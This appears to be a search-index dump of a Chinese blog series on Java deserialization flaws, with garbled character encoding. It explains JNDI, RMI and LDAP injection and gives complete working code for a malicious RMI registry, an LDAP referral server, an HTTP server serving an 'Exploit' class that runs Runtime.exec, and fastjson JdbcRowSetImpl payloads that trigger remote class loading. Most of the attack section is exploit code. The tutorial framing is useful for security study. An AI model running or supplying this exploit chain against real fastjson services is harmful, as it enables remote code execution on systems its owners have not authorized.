style=\"color:#e6db74\"\u003e\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;b\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dataSourceName\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rmi://localhost:1099/Exploit\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;autoCommit\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"fastjson--1247-ç»•è¿‡åŸç†\"\u003eFastjson \u0026lt;= 1.2.47 ç»•è¿‡åŸç†\u003c/h2\u003e\n\u003cp\u003eåœ¨å­¦ä¹ ç»•è¿‡åŸç†ä¹‹å‰ï¼Œäº†è§£ fastjson çš„åŸºæœ¬è§£ææµç¨‹è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œæˆ‘ç”»äº†ä¸€å¼ ç±»å›¾ä»…ä¾›å‚è€ƒï¼Œå›¾ä¸­åªç”»äº†ä¸»è¦æµç¨‹ï¼Œè¿˜æœ‰å¾ˆå¤šç±»æ²¡æœ‰ç”»ã€‚\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäº”ï¼‰fastjson 1.2.47 ç»•è¿‡åŸç†"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\nJNDI æ˜¯ä»€ä¹ˆ Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚\nJNDI åŒ…å«åœ¨Java SEä¸­ï¼Œä¸éœ€è¦å¼•ç”¨ç¬¬ä¸‰æ–¹jarå³å¯ä½¿ç”¨ã€‚è¦ä½¿ç”¨ JNDI å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æä¾›è€…ã€‚JDK æœ¬èº«å·²ç»åŒ…æ‹¬äº†ä¸‹é¢å‡ ç§æœåŠ¡æä¾›è€…ã€‚\nè½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP) CORBA å…¬å…±å¯¹è±¡æœåŠ¡å‘½åï¼ˆCOS namingï¼‰ Java è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI) åŸŸåæœåŠ¡ (DNS) è¿™ä¹ˆè¯´èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•ç†è§£å°±æ˜¯æœåŠ¡æä¾›è€…æä¾›ä¸€ä¸ªç±»ä¼¼Key Valueçš„æ•°æ®ï¼ŒJNDIå¯ä»¥é€šè¿‡è¿™ä¸ª Key è·å–åˆ°æœåŠ¡æä¾›è€…ä¸Šçš„æä¾›çš„Valueï¼Œå› æ­¤JNDIæ˜¯æ— æ³•å•ç‹¬ä½¿ç”¨çš„ã€‚\nä½¿ç”¨JNDIçš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªè·å–è¿œç¨‹å¯¹è±¡çš„ç¤ºä¾‹ä»£ç ã€‚\n// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ InitialContext context = new InitialContext(); // æŸ¥æ‰¾ç›‘å¬åœ¨æœ¬åœ° 1099 ç«¯å£ä¸Š RMI æœåŠ¡çš„ Object å¯¹è±¡ Object obj = context.lookup(\u0026#34;rmi://localhost:1099/Object\u0026#34;); RMI æ˜¯ä»€ä¹ˆ RMI æ˜¯ Remote Method Invocation çš„ç¼©å†™ï¼Œä¸­æ–‡å«ä¹‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³ä¸€ä¸ªJavaç¨‹åºè°ƒç”¨è°ƒç”¨å¦ä¸€ä¸ªJavaç¨‹åºæš´éœ²å‡ºæ¥çš„æ–¹æ³•ã€‚\nRMI æœ‰ä¸‰ä¸ªæ¦‚å¿µï¼š\nRegistry : æä¾›æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡è·å–ï¼ŒæœåŠ¡ç«¯å°†ç±»åç§°ï¼Œå­˜æ”¾åœ°å€æ³¨å†Œåˆ°Registryä¸­ï¼Œä»¥ä¾›å®¢æˆ·ç«¯è·å–ã€‚ Server : è¿œç¨‹æ–¹æ³•çš„æä¾›è€…ã€‚ Client : è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨è€…ã€‚ è¿œç¨‹æ–¹æ³•çš„å®šä¹‰éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\nå®ç° java.rmi.Remoteã€‚ ç»§æ‰¿ java.rmi.server.UnicastRemoteObjectã€‚ RMI ä½¿ç”¨ç¤ºä¾‹ Registry åˆ›å»º Registry\nimport java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.util.concurrent.CountDownLatch; public class RmiRegistry { private final static Integer rmiPort = 1099; public static void main(String[] args) throws RemoteException, InterruptedException { // åˆ›å»ºä¸€ä¸ª Registry LocateRegistry.createRegistry(rmiPort); System.out.println(\u0026#34;RMI server started on: 0.0.0.0:\u0026#34; + rmiPort); // é˜»å¡ä¸»çº¿ç¨‹ï¼Œé¿å…ç¨‹åºé€€å‡º CountDownLatch countDownLatch = new CountDownLatch(1); countDownLatch.await(); } } Server å®šä¹‰æ¥å£ï¼Œç›®çš„æ˜¯ç»™ Client ä½¿ç”¨ã€‚\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface HelloService extends Remote { void sayHello(String name) throws RemoteException; } å®šä¹‰å®ç°ç±»\nimport java.rmi.RemoteException; public class HelloServiceImpl implements HelloService { @Override public void sayHello(String name) throws RemoteException { System.out.println(\u0026#34;hello \u0026#34; + name); } } æ³¨å†Œå¯¹è±¡ï¼Œéœ€è¦å…ˆä½¿ç”¨ UnicastRemoteObject.exportObject() å°†å¯¹è±¡è½¬æ¢ä¸º skeletonï¼Œskeleton æ˜¯ RMI åº•å±‚åˆ›å»ºçš„ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå®ƒç»§æ‰¿äº† java.rmi.server.UnicastRemoteObjectï¼Œè´Ÿè´£ä¸ Client è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚\nimport java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class Server { public static void main(String[] args) throws Exception { // å®ä¾‹åŒ–è¦æš´éœ²çš„å¯¹è±¡ HelloService helloService = new HelloServiceImpl(); // å°†å¯¹è±¡æš´éœ²å‡ºå»ï¼ŒRMI åº•å±‚ä¼šåˆ›å»ºè¯¥å¯¹è±¡çš„ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå¹¶ç›‘å¬ä¸€ä¸ªç«¯å£ç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ HelloService skeleton = (HelloService) UnicastRemoteObject.exportObject(helloService, 1100); /*================= æ³¨å†Œæ–¹å¼ä¸€å¼€å§‹ ====================*/ // è·å– Registry Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); // å°†è¿™ä¸ªå¯¹è±¡æ³¨å†Œåˆ° Registry ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¿™ä¸ªå¯¹è±¡åœ¨ Registry ä¸­çš„åç§°ï¼Œå®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨è¿™ä¸ªåç§°æ‰èƒ½è·å–åˆ°è¿™ä¸ªå¯¹è±¡ registry.bind(\u0026#34;helloService\u0026#34;, skeleton); /*================= æ³¨å†Œæ–¹å¼ä¸€ç»“æŸ ====================*/ /*================= æ³¨å†Œæ–¹å¼äºŒå¼€å§‹ ====================*/ // Naming.bind(\u0026#34;rmi://localhost:1099/helloService\u0026#34;, skeleton); /*================= æ³¨å†Œæ–¹å¼äºŒç»“æŸ ====================*/ System.out.println(\u0026#34;export helloService\u0026#34;); } } å¯ä»¥çœ‹åˆ°æ³¨å†Œæ–¹å¼äºŒè¦æ¯”ä¸€ç®€æ´å¾ˆå¤šï¼Œè¿™æ˜¯ RMI ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…ä½¿ç”¨ï¼Œå°†æ³¨å†Œæ–¹å¼ä¸€åŒ…è£…äº†ä¸€å±‚ï¼Œç‚¹å‡»æºç å¯ä»¥çœ‹åˆ°å®ƒçš„å®ç°æ–¹å¼å’Œæ³¨å†Œæ–¹å¼ä¸€å¾ˆç›¸ä¼¼ã€‚\npublic static void bind(String name, Remote obj) throws AlreadyBoundException, java.net.MalformedURLException, RemoteException { ParsedNamingURL parsed = parseURL(name); Registry registry = getRegistry(parsed); if (obj == null) throw new NullPointerException(\u0026#34;cannot bind to null\u0026#34;); registry.bind(parsed.name, obj); } Client å®šä¹‰æ¥å£ï¼Œå› ä¸º Server å’Œ Client å­˜åœ¨ä¸åŒçš„ Java ç¨‹åºä¸­ï¼ŒClient æƒ³è¦è°ƒç”¨ Server ä¸Šé¢çš„æœåŠ¡éœ€è¦çŸ¥é“æ–¹æ³•æ‰å¯ä»¥ã€‚\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface HelloService extends Remote { void sayHello(String name) throws RemoteException; } è·å–å¯¹è±¡å¹¶è°ƒç”¨ï¼Œåœ¨è¿™é‡Œè·å–åˆ°çš„å¯¹è±¡æ˜¯ stubï¼Œstub è´Ÿè´£ä¸ Server è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œä¾‹å¦‚åœ¨è°ƒç”¨ sayHello() æ–¹æ³•æ—¶RMIé€šè¿‡ç½‘ç»œè¯·æ±‚ä½äºæœåŠ¡ç«¯çš„çœŸæ­£æ–¹æ³•ï¼Œå¦‚æœæœ‰è¿”å›å€¼æ—¶è¿˜ä¼šå°†å†…å®¹ä¼ é€’å›æ¥ã€‚\nimport java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main(String[] args) throws Exception { /*================= è·å–æ–¹å¼ä¸€å¼€å§‹ ====================*/ Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); HelloService stub = (HelloService) registry.lookup(\u0026#34;helloService\u0026#34;); /*================= è·å–æ–¹å¼ä¸€ç»“æŸ ====================*/ /*================= è·å–æ–¹å¼äºŒå¼€å§‹ ====================*/ // HelloService stub = (HelloService) Naming.lookup(\u0026#34;rmi://localhost:1099/helloService\u0026#34;); /*================= è·å–æ–¹å¼äºŒç»“æŸ ====================*/ stub.sayHello(\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); } } åŒç† Naming ä¹Ÿæä¾›äº†è·å–è¿œç¨‹å¯¹è±¡çš„åŠŸèƒ½ï¼Œå®ƒçš„æºç å¦‚ä¸‹ï¼š\npublic static Remote lookup(String name) throws NotBoundException, java.net.MalformedURLException, RemoteException { ParsedNamingURL parsed = parseURL(name); Registry registry = getRegistry(parsed); if (parsed.name == null) return registry; return registry.lookup(parsed.name); } æµ‹è¯• æŒ‰ç…§ Registry \u0026gt; Server \u0026gt; Client è¿™ä¸ªé¡ºåºå¯åŠ¨ï¼Œå¯ä»¥çœ‹åˆ° Client è°ƒç”¨æˆåŠŸä¹‹å Server æ‰“å°äº†å¦‚ä¸‹å†…å®¹ï¼š\nhello å®ˆæ³•å¸‚æ°‘å°æœ Registryã€Serverã€Client çš„è°ƒç”¨å…³ç³»å¯ä»¥æ€»ç»“ä¸ºè¿™ä¸ªå›¾ï¼š\nJNDI + RMI ç»„åˆä½¿ç”¨ å®šä¹‰ Registry import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.text.MessageFormat; public class RMIServer { private static final Integer rmiServerPort = 1099; private static final String httpServerAddress = \u0026#34;127.0.0.1\u0026#34;; private static final Integer httpServerPort = 80; public static void main(String[] args) throws Exception { // å·¥ç¨‹åœ°å€ï¼Œç›®çš„æ˜¯è®© JNDI åŠ è½½ä½äºæ­¤å¤„çš„ç±»æ–‡ä»¶ String factoryLocation = MessageFormat.format(\u0026#34;http://{0}:{1}/\u0026#34;, httpServerAddress, httpServerPort + \u0026#34;\u0026#34;); // åˆ›å»º Registry Registry registry = LocateRegistry.createRegistry(rmiServerPort); // åˆ›å»º JNDI çš„å¼•ç”¨ // className è¿œç¨‹å¯¹è±¡çš„ç±»åç§°ï¼Œä¸èƒ½ä¸ºnull // factory åŠ è½½ç±»æˆåŠŸåè¦å®ä¾‹åŒ–çš„ç±»åç§° // factoryLocation æä¾›ç±»æ–‡ä»¶çš„åœ°å€ï¼Œä¸ºnullæ—¶ä»æœ¬åœ°åŠ è½½ Reference reference = new Reference(\u0026#34;Exploit\u0026#34;, \u0026#34;Exploit\u0026#34;, factoryLocation); // å°† JNDIå¼•ç”¨ åŒ…è£…ä¸º RMI å¯æ³¨å†Œçš„ç±» ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); // å°†ç±»ä¿¡æ¯æ³¨å†Œåˆ° Registry registry.bind(\u0026#34;Exploit\u0026#34;, referenceWrapper); System.out.println(\u0026#34;[*] RMI server listening on: 0.0.0.0:\u0026#34; + rmiServerPort); } } å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆ›å»º Registry ä¹‹åå¹¶æ²¡æœ‰ export æŸä¸€å¯¹è±¡ï¼Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ª JNDI çš„ Referenceï¼Œç›®çš„æ˜¯ä¸ºäº†è®© JNDI å»åŠ è½½ä½äºæ­¤å¤„çš„ç±»æ–‡ä»¶ã€‚\næ—¢ç„¶æˆ‘ä»¬æŒ‡å®šäº†ç±»æ–‡ä»¶çš„å­˜æ”¾åœ°å€æ˜¯ä¸€ä¸ªHTTPåœ°å€ï¼Œé‚£æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªç±»ï¼Œå¹¶ä¸”å°†å…¶å­˜æ”¾åˆ°è¿™ä¸ªHTTPæœåŠ¡ä¸‹ã€‚\næ¶æ„ç±»ï¼Œç®€å•èµ·è§ä¸è¦æ·»åŠ åŒ…åç§°ã€‚\nimport java.io.IOException; public class Exploit { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } HTTPæœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨äº† sun å…¬å¸å†…ç½®åœ¨ jdk ä¸­çš„ä¸€ä¸ªhttp serverï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ nginxã€apacheã€tomcat ç­‰webæœåŠ¡å™¨ï¼Œåªéœ€è¦å°†ç¼–è¯‘åçš„ Exploit.class æ”¾åˆ°æ ¹ç›®å½•ä¸‹å³å¯ã€‚\nimport com.sun.net.httpserver.HttpServer; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import java.io.IOException; import java.io.OutputStream; import java.net.InetSocketAddress; public class WebServer { private static final Integer port = 80; public static void main(String[] args) throws IOException, NotFoundException, CannotCompileException { // ä½¿ç”¨ javassist è·å–ç±»å­—èŠ‚ ClassPool classPool = ClassPool.getDefault(); final CtClass ctClass = classPool.get(Exploit.class.getName()); // ä¿®æ”¹ç±»çš„åç§°ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†å»é™¤ç±»çš„åŒ…åï¼Œä¸ RMI Server ä¸­ä¿æŒä¸€è‡´ ctClass.setName(\u0026#34;Exploit\u0026#34;); final byte[] bytes = ctClass.toBytecode(); HttpServer server = HttpServer.create(new InetSocketAddress(port), 0); server.createContext(\u0026#34;/\u0026#34;, httpExchange -\u0026gt; { // å°†ç±»çš„å­—èŠ‚å†™å…¥åˆ° response ä¸­ System.out.println(\u0026#34;Req Begin...\u0026#34;); httpExchange.sendResponseHeaders(200, bytes.length); final OutputStream responseBody = httpExchange.getResponseBody(); responseBody.write(bytes); responseBody.close(); System.out.println(\u0026#34;Req End.\u0026#34;); }); System.out.println(\u0026#34;WebServer started at 0.0.0.0:\u0026#34; + port); server.start(); } } æœ€åæˆ‘ä»¬å†™ä¸€ä¸ªJNDIå’ŒRMIç»„åˆä½¿ç”¨çš„æµ‹è¯•\nimport javax.naming.InitialContext; import javax.naming.NamingException; public class JNDI_RMI { public static void main(String[] args) throws NamingException { InitialContext context = new InitialContext(); Object obj = context.lookup(\u0026#34;rmi://localhost:1099/Exploit\u0026#34;); System.out.println(\u0026#34;obj = \u0026#34; + obj); } } è¯·æ±‚ä¹‹åä¼šè¾“å‡ºä¼šæ˜¯ä¸€æ®µå¼‚å¸¸ä»£ç ï¼Œå¹¶ä¸”å¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œè¿™æ˜¯æ­£å¸¸çš„ã€‚\nException in thread \u0026#34;main\u0026#34; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory] at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) at cn.typesafe.jsv.fastjson.JNDI_RMI.main(JNDI_RMI.java:12) Caused by: java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163) at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319) at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464) ... 4 more æˆ‘ä»¬ç‚¹å‡»è¿›å…¥å¼‚å¸¸å †æ ˆæç¤ºçš„ä»£ç  at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)\nstatic ObjectFactory getObjectFactoryFromReference( Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class\u0026lt;?\u0026gt; clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null \u0026amp;\u0026amp; (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } å¯ä»¥çœ‹åˆ°åœ¨åŠ è½½ç±»æˆåŠŸåä½¿ç”¨åå°„åˆ›å»ºäº†è¿™ä¸ªç±»ï¼Œå¹¶ä¸”è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è¿™ä¸ªç±»å’Œjavax.naming.spi.ObjectFactoryæ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåœ¨å¼ºè½¬æ—¶å¿…ç„¶å¼‚å¸¸ï¼Œä½†è¿™å¹¶ä¸å½±å“æˆ‘ä»¬æ·»åŠ çš„ä»£ç å·²ç»æ‰§è¡Œäº†ã€‚\nJNDIå’ŒRMIçš„è°ƒç”¨æµç¨‹å¤§è‡´æ˜¯ï¼šJNDI åœ¨è¯·æ±‚åˆ° RMI ä¹‹åï¼ŒRMI è¿”å›äº† Exploit çš„ http åœ°å€ï¼ŒJNDI åˆ™é€šè¿‡ç½‘ç»œè·å–åˆ°äº†è¿™ä¸ªç±»æ–‡ä»¶ï¼Œé€šè¿‡ç±»åŠ è½½å™¨å°†å…¶åŠ è½½åˆ°äº†JVMä¸­å¹¶ä¸”å®ä¾‹åŒ–äº†è¿™ä¸ªç±»ï¼Œè€Œ Exploit çš„é™æ€ä»£ç å—å†…æ˜¯æ‰“å¼€è®¡ç®—å™¨çš„ä»£ç ï¼Œå®ä¾‹åŒ–æ—¶å°±ä¼šæ‰§è¡Œè¿™æ®µä»£ç ã€‚\nFastjson çš„ RMI/JNDI åˆ©ç”¨æ¼æ´ åœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬æœ‰è®²åˆ°åˆ©ç”¨ fastjson çš„ AutoType åŠŸèƒ½ï¼Œå¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»ã€‚å®‰å…¨äººå‘˜åˆ©ç”¨ com.sun.rowset.JdbcRowSetImpl çš„ JNDI åŠŸèƒ½åˆšå¥½èƒ½å¤Ÿè§¦å‘ä¸Šé¢ä»‹ç»çš„é‚£ä¸ªæµç¨‹ã€‚\ncom.sun.rowset.JdbcRowSetImpl æœ‰ä¸¤ä¸ªé‡è¦å±æ€§\ndataSourceName æ•°æ®æºåç§° autoCommit è§¦å‘JNDIè¯·æ±‚çš„å…³é”®å‚æ•° dataSourceName çš„ set æ–¹æ³•å¯ä»¥å¿½ç•¥ï¼Œå°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å‚æ•°èµ‹å€¼ã€‚\nautoCommit çš„ set æ–¹æ³•å¦‚ä¸‹ï¼š\npublic void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); this.conn.setAutoCommit(var1); } } com.sun.rowset.JdbcRowSetImpl åœ¨ååºåˆ—åŒ–å conn å‚æ•°å¿…ç„¶ä¸ºç©ºï¼Œä¼šè¿›å…¥ this.connect() æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ã€‚\nprivate Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null \u0026amp;\u0026amp; !this.getUsername().equals(\u0026#34;\u0026#34;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\u0026#34;jdbcrowsetimpl.connect\u0026#34;).toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } åˆšè¯´äº† conn å‚æ•°å¿…ç„¶ä¸ºç©ºï¼Œå› æ­¤å°±ä¼šæ‰§è¡Œ if çš„ç¬¬äºŒä¸ªåˆ†æ”¯ï¼Œè¿›è¡Œäº† JNDI è¯·æ±‚ã€‚\nå› æ­¤æ„é€ ä¸€ä¸ª POC ä¹Ÿå°±ååˆ†ç®€å•äº†ã€‚\nimport com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); } } å¯åŠ¨äº† RMIServer å’Œ WebServer åæ‰§è¡Œè¿™æ®µä»£ç å³å¯å®Œæˆæ¼æ´åˆ©ç”¨ã€‚\nLDAP + JNDI 2017å¹´ Oracle å‘å¸ƒäº†æ–°ç‰ˆ JDK é»˜è®¤ç¦ç”¨äº†é€šè¿‡å­˜å‚¨åœ¨å‘½åå’Œç›®å½•æœåŠ¡ä¸­çš„ JNDI å¯¹è±¡å·¥å‚è¿›è¡Œè¿œç¨‹ç±»åŠ è½½ã€‚è¦é€šè¿‡ RMI Registry æˆ– COS Naming æœåŠ¡æä¾›è€…å¯ç”¨è¿œç¨‹ç±»åŠ è½½ï¼Œè¯·æ ¹æ®éœ€è¦å°†ä»¥ä¸‹ç³»ç»Ÿå±æ€§è®¾ç½®ä¸ºå­—ç¬¦ä¸²â€œtrueâ€ï¼š\ncom.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase è¯¦ç»†çš„ç‰ˆæœ¬ä¿¡æ¯å¦‚ä¸‹ï¼š\nJRE å®¶åº­ç‰ˆ JRE å®‰å…¨åŸºçº¿ï¼ˆå®Œæ•´å­—ç¬¦ä¸²ï¼‰ 8 1.8.0_121-b13 7 1.7.0_131-b12 6 1.6.0_141-b12 æ¥æºï¼šhttps://www.oracle.com/java/technologies/javase/7u131-relnotes.html\nå› æ­¤å®‰å…¨äººå‘˜åˆæŒ–æ˜åˆ°äº†åŸºäº LDAP + JNDI çš„åˆ©ç”¨æ–¹å¼ï¼Œæµç¨‹å’Œ RMI + JNDI åŸºæœ¬ç›¸åŒã€‚\né¦–å…ˆæ˜¯åˆ›å»ºä¸€ä¸ª LDAP æœåŠ¡ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨åˆ°äº† unboundid-ldapsdk è¿™ä¸ªåº“ã€‚\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.text.MessageFormat; public class LDAPServer { private static final String javaCodeBase = \u0026#34;http://127.0.0.1:80/\u0026#34;; private static final String javaClassName = \u0026#34;Exploit\u0026#34;; public static void main(String[] args) throws Exception { int port = 1389; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(\u0026#34;dc=example,dc=com\u0026#34;); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new EvalInMemoryOperationInterceptor()); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } public static class EvalInMemoryOperationInterceptor extends InMemoryOperationInterceptor { @Override public void processSearchResult(InMemoryInterceptedSearchResult result) { String baseDN = result.getRequest().getBaseDN(); Entry e = new Entry(baseDN); e.addAttribute(\u0026#34;javaClassName\u0026#34;, javaClassName); e.addAttribute(\u0026#34;javaFactory\u0026#34;, javaClassName); e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, javaCodeBase); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); System.out.println(MessageFormat.format(\u0026#34;Send LDAP reference result for {0} redirecting to {1}{2}.class\u0026#34;, baseDN, javaCodeBase, javaClassName)); try { result.sendSearchEntry(e); } catch (LDAPException ex) { ex.printStackTrace(); } result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } Http æœåŠ¡ä¿æŒä¸å˜\næµ‹è¯•ä»£ç ä¿®æ”¹ä¸º\nimport com.alibaba.fastjson.JSON; public class Eval4 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:1389/Exploit\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); } } åªéœ€è¦ä¿®æ”¹ dataSourceName 